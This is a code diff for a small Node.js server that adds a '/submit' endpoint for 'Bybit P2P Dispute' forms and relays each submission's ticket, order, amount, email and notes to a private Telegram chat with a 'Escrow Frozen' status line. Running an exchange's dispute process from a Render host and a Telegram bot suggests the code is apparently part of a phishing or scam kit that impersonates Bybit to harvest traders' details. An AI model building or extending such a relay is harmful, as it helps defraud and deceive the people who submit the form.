@@ -1,42 +1,130 @@
 /**
  * Production Static Server for Render Deployment
- * Zero dependencies required. Reads PORT from environment.
+ * Includes Telegram bot notification on dispute submission.
  */
 
 const http = require('http');
+const https = require('https');
 const fs = require('fs');
 const path = require('path');
 
 const PORT = process.env.PORT || 3000;
 const HOST = '0.0.0.0';
 
+// ─── Telegram Config (set via Render environment variables) ───────────────────
+const TG_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TG_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
+
 const MIME_TYPES = {
   '.html': 'text/html; charset=utf-8',
-  '.css': 'text/css; charset=utf-8',
-  '.js': 'application/javascript; charset=utf-8',
+  '.css':  'text/css; charset=utf-8',
+  '.js':   'application/javascript; charset=utf-8',
   '.json': 'application/json; charset=utf-8',
-  '.png': 'image/png',
-  '.jpg': 'image/jpeg',
+  '.png':  'image/png',
+  '.jpg':  'image/jpeg',
   '.jpeg': 'image/jpeg',
-  '.svg': 'image/svg+xml',
-  '.ico': 'image/x-icon'
+  '.svg':  'image/svg+xml',
+  '.ico':  'image/x-icon'
 };
 
-const server = http.createServer((req, res) => {
-  // Health check endpoint for Render
+// ─── Telegram Sender ──────────────────────────────────────────────────────────
+function sendTelegram(text) {
+  if (!TG_BOT_TOKEN || !TG_CHAT_ID) {
+    console.warn('[Telegram] Bot token or chat ID not configured.');
+    return;
+  }
+
+  const body = JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' });
+  const options = {
+    hostname: 'api.telegram.org',
+    path: `/bot${TG_BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(body)
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    console.log(`[Telegram] Response: ${res.statusCode}`);
+  });
+  req.on('error', (e) => console.error('[Telegram] Error:', e.message));
+  req.write(body);
+  req.end();
+}
+
+// ─── Read POST Body ───────────────────────────────────────────────────────────
+function readBody(req) {
+  return new Promise((resolve, reject) => {
+    let data = '';
+    req.on('data', chunk => { data += chunk; });
+    req.on('end', () => {
+      try { resolve(JSON.parse(data)); }
+      catch { reject(new Error('Invalid JSON')); }
+    });
+    req.on('error', reject);
+  });
+}
+
+// ─── HTTP Server ──────────────────────────────────────────────────────────────
+const server = http.createServer(async (req, res) => {
+
+  // Health check
   if (req.url === '/healthz' || req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('OK');
     return;
   }
 
-  // Parse safe file path
+  // ── Dispute submission endpoint ──────────────────────────────────────────
+  if (req.url === '/submit' && req.method === 'POST') {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    try {
+      const data = await readBody(req);
+
+      const msg =
+`🔴 <b>New Bybit P2P Dispute Received</b>
+
+🎫 <b>Ticket ID:</b> ${data.ticketId || 'N/A'}
+📦 <b>Order ID:</b> ${data.orderId || 'N/A'}
+💰 <b>Disputed Amount:</b> ${data.claimAmount || 'N/A'}
+📧 <b>Contact Email:</b> ${data.email || 'N/A'}
+📋 <b>Dispute Reason:</b> ${data.reasonText || 'N/A'}
+📎 <b>Evidence File:</b> ${data.evidenceFile || 'None'}
+📝 <b>Notes:</b> ${data.notes || 'None'}
+🕒 <b>Timestamp:</b> ${data.timestamp || new Date().toISOString()}
+📊 <b>Status:</b> Escrow Frozen – Under Mediation Review`;
+
+      sendTelegram(msg);
+
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true }));
+    } catch (err) {
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: err.message }));
+    }
+    return;
+  }
+
+  // OPTIONS preflight
+  if (req.method === 'OPTIONS') {
+    res.writeHead(204, {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type'
+    });
+    res.end();
+    return;
+  }
+
+  // ── Static file serving ──────────────────────────────────────────────────
   let safeUrl = req.url.split('?')[0];
   if (safeUrl === '/') safeUrl = '/index.html';
 
   const filePath = path.join(__dirname, safeUrl);
 
-  // Prevent path traversal
   if (!filePath.startsWith(__dirname)) {
     res.writeHead(403, { 'Content-Type': 'text/plain' });
     res.end('Forbidden');
@@ -45,7 +133,6 @@ const server = http.createServer((req, res) => {
 
   fs.stat(filePath, (err, stats) => {
     if (err || !stats.isFile()) {
-      // Fallback to index.html for SPA routing
       const indexPath = path.join(__dirname, 'index.html');
       fs.readFile(indexPath, (readErr, content) => {
         if (readErr) {
